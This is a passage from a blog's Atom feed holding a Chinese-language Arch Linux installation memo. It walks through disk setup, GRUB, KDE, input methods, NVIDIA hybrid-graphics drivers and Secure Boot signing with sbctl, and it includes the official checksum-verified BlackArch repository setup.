<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://zjw1nd.github.io/atom.xml" rel="self"/>
  
  <link href="https://zjw1nd.github.io/"/>
  <updated>2025-02-25T02:25:11.187Z</updated>
  <id>https://zjw1nd.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Arch安装备忘手册</title>
    <link href="https://zjw1nd.github.io/2025/02/24/Arch%E5%AE%89%E8%A3%85%E5%A4%87%E5%BF%98%E6%89%8B%E5%86%8C/"/>
    <id>https://zjw1nd.github.io/2025/02/24/Arch%E5%AE%89%E8%A3%85%E5%A4%87%E5%BF%98%E6%89%8B%E5%86%8C/</id>
    <published>2025-02-24T08:30:11.000Z</published>
    <updated>2025-02-25T02:25:11.187Z</updated>
    
    <content type="html"><![CDATA[<p><strong>首先的首先，最重要的参考来自于<a href="https://arch.icekylin.online/guide/rookie/pre-install.html">archlinux简明指南</a></strong>。</p><h1>写在前面</h1><p>这篇文章的目的是整齐，简明地归纳笔者自己日常linux所接触到的一些经验，免得在搜索引擎屎里淘金。但是作者本人的记性很不好，所以可能有所缺疏。特别地，本文尤其针对的是<code>ArchLinux</code>这一发行版。</p><h1>你是否需要从0开始安装一个基本系统？</h1><p>直接参考<a href="https://arch.icekylin.online/guide/rookie/pre-install.html">archlinux简明指南</a>，正如指南中强调的，不要试图更改一些指南中提供的设置，除非你<strong>真的真的完全知道</strong>自己在做什么。这部分的经验对于所有操作系统应当都是类似的。</p><p>简单来说就是：</p><ul class="lvl-0"><li class="lvl-2"><p>同步时间，联网，换源</p></li><li class="lvl-2"><p>分区和格式化，efi，交换分区和主分区（btrfs）</p></li><li class="lvl-2"><p>挂载并安装系统，设置基本信息如时区，用户名密码</p></li><li class="lvl-2"><p>安装引导程序和其他必须组件</p></li></ul><p>由于pacman的强大，过程并不困难</p><h2 id="btrfs">btrfs</h2><blockquote><p>同样，可以阅读archlinux简明指南上的<a href="https://arch.icekylin.online/guide/advanced/btrfs.html">介绍</a>不要安装传统的ext4 linux文件系统，使用更好的btrfs。我们不关心具体怎么实现的，只知道这是一个提供了很多很好特性的文件系统即可。</p></blockquote><p>尤其是对于：</p><ul class="lvl-0"><li class="lvl-2"><p>SSD的大幅优化，包括写时复制和透明压缩特性</p></li><li class="lvl-2"><p>子卷和克隆特性让其支持非常方便的快照（甚至是快照的快照）</p></li></ul><p>其中，后者特性对于archlinux是非常重要的，因为arch不停地在滚动更新，我们折腾的时候会非常有帮助。采用神奇的btrfs后，我们的系统就能用<strong>极其</strong>小的空间进行增量快照备份。（而相对的，使用ext4符合我们的直觉——快照需要拷贝整个磁盘）</p><h2 id="这一部分的快速命令指南：">这一部分的快速命令指南：</h2><p>LiveCD使用windows下的rufus制作。下面我会列出archlinux简明指南上所有相关的命令和作用。这一部分假设不会遇到任何的问题和报错。</p><blockquote><p>LiveCD环境下:</p></blockquote><h3 id="同步时间，联网，换源">同步时间，联网，换源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#-- 禁用镜像内的自动更新源服务，人在国外的就无所谓了</span><br><span class="line">systemctl stop reflector.service</span><br><span class="line"># 检查状态</span><br><span class="line">systemctl status reflector.service</span><br><span class="line"></span><br><span class="line">#-- 无线连接网络，有线应当自动连接</span><br><span class="line">iwctl # 进入交互式命令行</span><br><span class="line">device list # 列出无线网卡设备名，比如无线网卡看到叫 wlan0</span><br><span class="line">station wlan0 scan # 扫描网络</span><br><span class="line">station wlan0 get-networks # 列出所有 wifi 网络</span><br><span class="line">station wlan0 connect wifi-name # 进行连接，注意这里无法输入中文。回车后输入密码即可</span><br><span class="line">exit # 连接成功后退出</span><br><span class="line"></span><br><span class="line">#-- 更新时钟</span><br><span class="line">timedatectl set-ntp true</span><br><span class="line"># 检查</span><br><span class="line">timedatectl status</span><br><span class="line"></span><br><span class="line">#--换源</span><br><span class="line">vim /etc/pacman.d/mirrorlist</span><br><span class="line"># 添加国内源，如果自己的学校有优先用自己的，放在最上面</span><br><span class="line"># 不要在这一步添加archlinuxcn</span><br><span class="line">Server = https://mirrors.hust.edu.cn/archlinux/$repo/os/$arch # 华科的</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch # 中国科学技术大学开源镜像站</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch # 清华大学开源软件镜像站</span><br><span class="line">Server = https://repo.huaweicloud.com/archlinux/$repo/os/$arch # 华为开源镜像站</span><br><span class="line">Server = http://mirror.lzu.edu.cn/archlinux/$repo/os/$arch # 兰州大学开源镜像站</span><br></pre></td></tr></table></figure><h3 id="分区和格式化">分区和格式化</h3><p>遇到的问题或想使用ext4分区请参考<a href="https://arch.icekylin.online/guide/rookie/basic-install-detail.html">ArchLinux简明指南</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsblk # 查看设备</span><br><span class="line">cfdisk /dev/sd_ </span><br></pre></td></tr></table></figure><p><font color=lightyellow>注意⚠️，cfdisk对于大小的设置是M和G而不是Mb和Gb，输入Mb和Gb也能识别但大小会有误，务必检查</font></p><p>cfdisk的界面完全是可读的。参考简明指南即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 检查</span><br><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p>格式化操作如下，如果和windows共存则不要格式化efi分区，以下操作都是对<strong>新</strong>空间操作的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#efi</span><br><span class="line">mkfs.fat -F32 /dev/sdxn #sata</span><br><span class="line">mkfs.fat -F32 /dev/nvmexn1pn # nvme</span><br><span class="line"></span><br><span class="line">mkswap /dev/sdxn #swap</span><br><span class="line"></span><br><span class="line">mkfs.btrfs -L MyArch /dev/sdxn #btrfs,-L是名字-label，无特殊字符和空格</span><br></pre></td></tr></table></figure><p>设置btrfs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mount -t btrfs -o compress=zstd /dev/sdxn /mnt #挂载</span><br><span class="line"># 这是为了使用timeshift做准备，请尽可能严格按照这个分区命名和设置</span><br><span class="line">btrfs subvolume create /mnt/@ # 创建 / 目录子卷</span><br><span class="line">btrfs subvolume create /mnt/@home # 创建 /home 目录子卷</span><br><span class="line">btrfs subvolume list -p /mnt #检查</span><br><span class="line">umount /mnt</span><br><span class="line"># 挂载系统</span><br><span class="line">mount -t btrfs -o subvol=/@,compress=zstd /dev/sdxn /mnt # 挂载 / 目录</span><br><span class="line">mkdir /mnt/home # 创建 /home 目录</span><br><span class="line">mount -t btrfs -o subvol=/@home,compress=zstd /dev/sdxn /mnt/home # 挂载 /home 目录</span><br><span class="line">mkdir -p /mnt/boot # 创建 /boot 目录</span><br><span class="line">mount /dev/sdxn /mnt/boot # 挂载 /boot 目录</span><br><span class="line">swapon /dev/sdxn # 挂载交换分区</span><br></pre></td></tr></table></figure><h3 id="安装系统">安装系统</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pacstrap /mnt base base-devel linux linux-firmware btrfs-progs</span><br><span class="line"># 如果使用btrfs文件系统，额外安装一个btrfs-progs包</span><br><span class="line">pacstrap /mnt networkmanager vim sudo zsh zsh-completions # 其实bash也行</span><br><span class="line"></span><br><span class="line">genfstab -U /mnt &gt; /mnt/etc/fstab</span><br><span class="line">cat /mnt/etc/fstab # 检查</span><br><span class="line"></span><br><span class="line">arch-chroot /mnt # 切换</span><br></pre></td></tr></table></figure><blockquote><p>💡Tips: 注意，在我们的系统无法启动什么也做不了的时候，同样可以用livecd的这个命令检查修复</p></blockquote><p>从这一步后，我们就进入了真正的系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hostname # 输入主机名即可</span><br><span class="line">vim /etc/hosts #配置本地hosts如下</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1   localhost</span><br><span class="line">::1         localhost</span><br><span class="line">127.0.1.1   myarch.localdomain myarch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime # 时区</span><br><span class="line">hwclock --systohc # 硬件同步时间</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/locale.gen # 去掉enUS和zhCN 两个utf8的注释</span><br><span class="line">locale-gen</span><br><span class="line">echo &#x27;LANG=en_US.UTF-8&#x27;  &gt; /etc/locale.conf</span><br><span class="line"></span><br><span class="line">passwd root</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S intel-ucode <span class="comment"># Intel 微码</span></span><br><span class="line">pacman -S amd-ucode <span class="comment"># AMD</span></span><br></pre></td></tr></table></figure><h3 id="grub引导">grub引导</h3><p>建议配置，grub引导比没有强，作者之前不用，u盘直插启动，内核参数相关的配置稍微繁琐一点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -S grub efibootmgr os-prober</span><br><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=ARCH</span><br><span class="line">vim /etc/default/grub</span><br></pre></td></tr></table></figure><p>配置grub参数需要：</p><ul class="lvl-0"><li class="lvl-2"><p>GRUB_CMDLINE_LINUX_DEFAULT内核参数去掉quiet，loglevel=5方便观察</p></li><li class="lvl-2"><p>加入nowatchdog（参考<a href="https://arch.icekylin.online/guide/rookie/basic-install.html#_17-%E5%AE%89%E8%A3%85%E5%BC%95%E5%AF%BC%E7%A8%8B%E5%BA%8F">这里</a>）</p></li><li class="lvl-2"><p>如果要配置n卡驱动怕等下遇到问题，可以提前加入ibt=off等</p></li><li class="lvl-2"><p>取消最后一行的GRUB_DISABLE_OS_PROBER=false注释，如果要引导win的话</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br><span class="line"></span><br><span class="line">exit # 退回安装环境</span><br><span class="line">umount -R /mnt # 卸载新分区</span><br><span class="line">reboot # 重启</span><br></pre></td></tr></table></figure><h3 id="重启后">重启后</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable --now NetworkManager</span><br><span class="line"># 无线：</span><br><span class="line">nmcli dev wifi list # 显示附近的 Wi-Fi 网络</span><br><span class="line">nmcli dev wifi connect &quot;Wi-Fi名（SSID）&quot; password &quot;网络密码&quot; # 连接指定的无线网络</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bash_profile #添加 export EDITOR=&#x27;vim&#x27;</span><br><span class="line">useradd -m -G wheel -s /bin/bash myusername</span><br><span class="line">passwd myusername</span><br><span class="line">EDITOR=vim visudo # 这里需要显式的指定编辑器，因为上面的环境变量还未生效</span><br><span class="line"># 取消注释这一行： </span><br><span class="line">#%wheel ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>开启pacman32位和archlinuxcn：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pacman.conf</span><br><span class="line"># 去掉multilib注释</span><br><span class="line"># 添加（选一个也行）：</span><br><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.hust.edu.cn/archlinuxcn/$arch</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch # 中国科学技术大学开源镜像站</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch # 清华大学开源软件镜像站</span><br><span class="line">Server = https://mirrors.hit.edu.cn/archlinuxcn/$arch # 哈尔滨工业大学开源镜像站</span><br><span class="line">Server = https://repo.huaweicloud.com/archlinuxcn/$arch # 华为开源镜像站</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -Syyu</span><br></pre></td></tr></table></figure><h1>更细节的设置命令</h1><h2 id="安装桌面和必备其他组件">安装桌面和必备其他组件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pacman -S plasma-meta konsole dolphin # plasma-meta 元软件包、konsole 终端模拟器和 dolphin 文件管理器</span><br><span class="line">pacman -S  plasma-workspace xdg-desktop-portal egl-wayland</span><br><span class="line"># N卡用户需要额外安装egl-wayland,xdg-desktop-portal包是为了如obs此类工具录制屏幕使用</span><br><span class="line"># xdg-desktop-portal包组提供了不同环境下使用的软件包</span><br><span class="line"># 例如kde用户可选择xdg-desktop-portal-kde包</span><br><span class="line">systemctl enable sddm</span><br><span class="line">systemctl start sddm  # 或者重启reboot</span><br><span class="line"># n卡推荐x11启动</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S sof-firmware alsa-firmware alsa-ucm-conf # 声音固件</span><br><span class="line">sudo pacman -S ntfs-3g # 使系统可以识别 NTFS 格式的硬盘，双系统必装，win是ntfs</span><br><span class="line">sudo pacman -S adobe-source-han-serif-cn-fonts wqy-zenhei # 安装几个开源中文字体。一般装上文泉驿就能解决大多 wine 应用中文方块的问题</span><br><span class="line">sudo pacman -S noto-fonts noto-fonts-cjk noto-fonts-emoji noto-fonts-extra # 安装谷歌开源字体及表情</span><br><span class="line">sudo pacman -S ark # 压缩软件。在 dolphin 中可用右键解压压缩包</span><br><span class="line">sudo pacman -S gwenview # 图片查看器</span><br><span class="line">sudo pacman -S archlinuxcn-keyring # cn 源中的签名（archlinuxcn-keyring 在 archlinuxcn）</span><br><span class="line">sudo pacman -S yay # yay 命令可以让用户安装 AUR 中的软件（yay 在 archlinuxcn）</span><br></pre></td></tr></table></figure><h2 id="输入法">输入法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S fcitx5-im # 输入法基础包组</span><br><span class="line">sudo pacman -S fcitx5-chinese-addons # 官方中文输入引擎</span><br><span class="line">sudo pacman -S fcitx5-anthy # 日文输入引擎</span><br><span class="line">sudo pacman -S fcitx5-pinyin-moegirl # 萌娘百科词库。二刺猿必备（archlinuxcn）</span><br><span class="line">sudo pacman -S fcitx5-material-color # 输入法主题</span><br></pre></td></tr></table></figure><p>编辑<code>~/.config/environment.d/im.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># fix fcitx problem</span><br><span class="line">GTK_IM_MODULE=fcitx</span><br><span class="line">QT_IM_MODULE=fcitx</span><br><span class="line">XMODIFIERS=@im=fcitx</span><br><span class="line">SDL_IM_MODULE=fcitx</span><br><span class="line">GLFW_IM_MODULE=ibus</span><br></pre></td></tr></table></figure><p>更进一步的配置/更好用的输入法参见<a href="https://arch.icekylin.online/guide/advanced/optional-cfg-1#%F0%9F%8D%80%EF%B8%8F-%E8%BE%93%E5%85%A5%E6%B3%95">可选配置</a></p><h2 id="timeshift">timeshift</h2><p>pacman就行，参考<a href="https://arch.icekylin.online/guide/rookie/desktop-env-and-app.html">应用安装</a></p><h2 id="blackArch">blackArch</h2><p><a href="https://www.blackarch.org/downloads.html">官网</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Run https://blackarch.org/strap.sh as root and follow the instructions.</span><br><span class="line"></span><br><span class="line">$ curl -O https://blackarch.org/strap.sh</span><br><span class="line"># Verify the SHA1 sum</span><br><span class="line"></span><br><span class="line">$ echo bbf0a0b838aed0ec05fff2d375dd17591cbdf8aa strap.sh | sha1sum -c</span><br><span class="line"># Set execute bit</span><br><span class="line"></span><br><span class="line">$ chmod +x strap.sh</span><br><span class="line"># Run strap.sh</span><br><span class="line"></span><br><span class="line">$ sudo ./strap.sh</span><br><span class="line"># Enable multilib following https://wiki.archlinux.org/index.php/Official_repositories#Enabling_multilib and run:</span><br><span class="line"></span><br><span class="line">$ sudo pacman -Syu</span><br></pre></td></tr></table></figure><h1>显卡驱动</h1><p>这里的所有内容只适用于iu+n卡，其他请参考archwiki或archlinux简明教程对应的部分。如果你也是同样配置并且需要笔记本双显卡，下面的内容可能会很管用。个人笔记本是y9000x 2022版本。</p><blockquote><p>这不一定适用于你的笔记本和显卡！</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">                  -`                    zjw1nd@MATRIX-02-B </span><br><span class="line">                 .o+`                   ------------------ </span><br><span class="line">                `ooo/                   OS: Arch Linux x86_64 </span><br><span class="line">               `+oooo:                  Host: 82TF Legion Y9000X IAH7 </span><br><span class="line">              `+oooooo:                 Kernel: 6.13.4-arch1-1 </span><br><span class="line">              -+oooooo+:                Uptime: 3 hours, 2 mins </span><br><span class="line">            `/:-:++oooo+:               Packages: 1033 (pacman) </span><br><span class="line">           `/++++/+++++++:              Shell: zsh 5.9 </span><br><span class="line">          `/++++++++++++++:             Resolution: 2560x1440 </span><br><span class="line">         `/+++ooooooooooooo/`           DE: Plasma 6.3.1 </span><br><span class="line">        ./ooosssso++osssssso+`          WM: KWin </span><br><span class="line">       .oossssso-````/ossssss+`         Theme: Breeze-Dark [GTK2], Breeze [GTK3] </span><br><span class="line">      -osssssso.      :ssssssso.        Icons: breeze-dark [GTK2/3] </span><br><span class="line">     :osssssss/        osssso+++.       Terminal: konsole </span><br><span class="line">    /ossssssss/        +ssssooo/-       Terminal Font: FiraCode Nerd Font 10 </span><br><span class="line">  `/ossssso+/:-        -:/+osssso+-     CPU: 12th Gen Intel i7-12700H (20) @ 4.600GHz </span><br><span class="line"> `+sso+:-`                 `.-/+oso:    GPU: Intel Alder Lake-P GT2 [Iris Xe Graphics] </span><br><span class="line">`++:.                           `-/+/   GPU: NVIDIA GeForce RTX 3060 Mobile / Max-Q </span><br><span class="line">.`                                 `/   Memory: 6705MiB / 39850MiB</span><br></pre></td></tr></table></figure><h2 id="首先，安装核显和n卡的驱动">首先，安装核显和n卡的驱动</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S mesa lib32-mesa vulkan-intel lib32-vulkan-intel</span><br></pre></td></tr></table></figure><p><font color=red>⚠️再次强调，英伟达的闭源驱动是和内核版本强绑定的，请一定在安装n卡驱动前执行pacman Syu操作！否则会出现很多意想不到的问题</font></p><p><strong>如果你不确定，则先不要执行下面的命令</strong>，先向后看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S nvidia-open nvidia-settings lib32-nvidia-utils # 必须安装</span><br><span class="line">nvidia-smi #检查，输出在gpu上工作的进程</span><br><span class="line">lspci | grep -i vga #检查，看你的显卡驱动，这个可以执行</span><br></pre></td></tr></table></figure><p>安装后，先将kms从<code>/etc/mkinitcpio.conf</code>里的HOOKS移除并重新生成initramfs,即<code>mkinitcpio -P</code>。这样可以避免initramfs包含nouveau。我个人的环境重装后执行到这里就可以了。</p><p>3060 mobile是一个很尬的版本。我个人在更新内核后直接安装了nvidia-open包就没问题了，但是过程中踩了一万个坑，现在，下面是一些备选的解决方法，我不确定哪些有用但提供在这里。同时建议n卡使用xorg显示服务器，n卡对wayland的支持并不算好，wayland主要是流畅动画和hdr，如果需要wayland则继续向后看。</p><ul class="lvl-0"><li class="lvl-2"><p>无论怎么装nvidia-smi都显示连接不到驱动——很可能是上面说的内核版本的问题</p></li><li class="lvl-2"><p>添加内核参数<code>ibt=off</code>，如果你使用了grub，则编辑<code>/etc/default/grub</code>中的内核参数<code>CMDLINE_DEFAULT</code>.如果没有，则参考archlinux wiki上的<a href="https://wiki.archlinuxcn.org/wiki/%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0">内核参数</a>页面进行配置，有很多办法。这是intel的一个间接跳转控制流保护机制，简单来说就是只允许<code>jmp rax</code>这样的指令在核态跳到标记过的位置。</p></li><li class="lvl-2"><p>安装后发现n卡驱动还是开源驱动nouveau——arch自带了开源驱动nouveau，才能点亮桌面的。n卡应该默认会屏蔽nouveau，如果没有可以卸载nouveau，并在内核参数中添加黑名单禁止nouveau的加载。内核启动参数添加<code>module_blacklist=nouveau</code>然后更新grub。或在<code>/etc/modprobe.d</code>中创建一个<code>blacklist.conf</code>，添加</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset=0</span><br></pre></td></tr></table></figure><p>同理，类似的思想可以用于很多地方，也可以反向让nouveau开启。</p><ul class="lvl-0"><li class="lvl-2"><p>如果你不是用的“linux”内核，而是linux-zen或者linux-lts，则安装对应驱动，将nvidia-open替换为<code>nvidia-open-lts,nvida-open-zen或nvidia-open-dkms</code>。需要注意的是，dkms包是一个不和内核绑定的驱动，在其他驱动遇到问题之后也可以再来尝试这个驱动。dkms需要内核对应的linuxheader，一般会作为依赖一起安装。</p></li><li class="lvl-2"><p>如果你需要Wayland，还需要启用两个nvidia_drm的两个内核参数：modeset和fbdev，二者在新的nvidia驱动包中被默认启用，但还是建议自己在内核参数添加一下。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/module/nvidia_drm/parameters/fbdev # 检查，失败返回缺少文件</span><br><span class="line">cat /sys/module/nvidia_drm/parameters/modeset # 正确返回Y</span><br></pre></td></tr></table></figure><p>以上都没能解决的话，更多的内容，可以参考archlinuxwiki上的<a href="https://wiki.archlinuxcn.org/wiki/NVIDIA">NVIDIA</a>和<a href="https://wiki.archlinuxcn.org/wiki/NVIDIA/%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4">NVIDIA/故障排错</a></p><h2 id="双显卡配置">双显卡配置</h2><p>我个人使用了optimus-manager，所以推荐这个。envycontrol把我电脑整崩溃了所以个人不推荐，当然你也可以试试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yay -S optimus-manager optimus-manager-qt</span><br><span class="line">sudo systemctl enable optimus-manager.service</span><br></pre></td></tr></table></figure><p>这时重启应该就能使用optimus-manager了。<br><font color=lightyellow>⚠️注意，如果你对你的环境没有自信（比如我），一定要在每次切换显卡完后手动注销一次观察是否正常再关机，不要切换后直接关机，否则可能会莫名其妙的黑屏</font>更多的与游戏运行，双显卡动态工作切换相关的可以参考<a href="https://arch.icekylin.online/guide/rookie/graphic-driver.html">简明指南</a></p><p>然后是电源策略，对于双显卡，如果不做手动电源策略配置，一般来说就算切换到集显模式，没有bios禁用独显的话，它也会一直工作耗电，很sb。因此需要我们配置optimus的电源策略。我个人尝试过的有两种，bbswitch策略在切换集显关机后再开tty2就黑屏了，我也不知道怎么修，tty3能用，反正刚装好没多久就重装了。</p><blockquote><p>重装是解决arch很多问题最快的方案（）</p></blockquote><p>对于电源策略，请参考optimus-manager的<a href="https://github.com/Askannz/optimus-manager/wiki/A-guide--to-power-management-options">官方文档</a>，并且一定要<strong>看完</strong>。我采用的策略就是第一条，首先将optimus-manager的电源策略设置为custom,然后找到它的配置文件<code>/etc/optimus-manager/optimus-manager.conf</code>，将nvidia下的参数设置这一条<code>dynamic_power_management=fine</code>即可。这时，n卡自带的电源策略会根据其参数设置（fine: 短时间没有进程向gpu提交作业后进入低功耗；coarse: 没有应用使用n卡驱动后进入低功耗，参考<a href="https://github.com/Askannz/optimus-manager/blob/master/optimus-manager.conf">默认配置的注释</a>）降低自己的功耗，这时可以一直开hybrid模式。注意，这一功能需要n卡支持，请通过:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/driver/nvidia/gpus/0000:01:00.0/power</span><br><span class="line"># Runtime D3 status: xxx会显示是否支持</span><br></pre></td></tr></table></figure><p>来查看是否支持。</p><p><font color=red>⚠️注意，电源策略是非常“个性化”的，需要尝试，请确保更改前做备份，或是保留了重装的livecd，我就是在bbswitch黑屏了重装的</font></p><h1>安全启动</h1><p>可以结合<a href="https://zjw1nd.github.io/2025/2/24/linux%E6%9D%82%E8%B0%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">这篇</a>一起看</p><p>如果由于某些原因（指瓦洛兰特国际服反作弊vanguard）你需要平常开启安全启动，则可以参考这里。上面的blog中提供了自己手动签名内核并写入uefi的办法，</p><p>对于arch，有一个很好用的软件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S sbctl</span><br></pre></td></tr></table></figure><p><font color=lightyellow>⚠️注意，这一软件未必对所有的硬件环境都有效，可能仍然需要手动签名</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sbctl create-keys</span><br><span class="line">sbctl enroll-keys -m # 密钥和微软的一起登入uefi</span><br><span class="line">sbctl verify</span><br><span class="line">sbctl sign -s /boot/vmlinuz-linux</span><br><span class="line">sbctl sign -s /boot/EFI/BOOT/BOOTX64.EFI #  